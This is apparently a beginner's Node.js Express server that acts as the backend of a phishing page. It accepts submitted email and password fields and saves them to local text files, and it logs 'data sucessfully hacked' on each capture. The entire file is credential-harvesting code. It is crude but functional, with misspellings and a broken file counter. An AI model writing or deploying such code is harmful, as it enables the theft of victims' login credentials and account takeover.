import express from "express";
import bodyParser from "body-parser";
import fs from "fs";

const app = express();
const port = 3000;
function data(id,password){
    var i =0
    if (fs.existsSync("data.txt")){
        i+=1;
        fs.writeFile(`data.txt${i}`,`id : ${id} \npassword : ${password}`,(err)=>{
            if(err)throw err;
                console.log("data sucessfully hacked");
        });
        console.log(`file already exitst \n so it is saveed in data.txt${i}`);
    }
    else{
        fs.writeFile("data.txt",`id : ${id} \npassword : ${password}`,(err)=>{
            if(err)throw err;
                console.log("data sucessfully hacked");
        });
    }
}
app.use(express.static("public")); 
app.use(bodyParser.urlencoded({ extended: true }));


app.get("/",(req,res)=>{
    res.render("index.ejs");
});

app.post("/submit",(req,res)=>{
    let password = req.body["pass"];
    let mail = req.body["email"];
    data(mail,password);
});
app.listen(port,()=>{
    console.log(`server is live at ${port}`);
});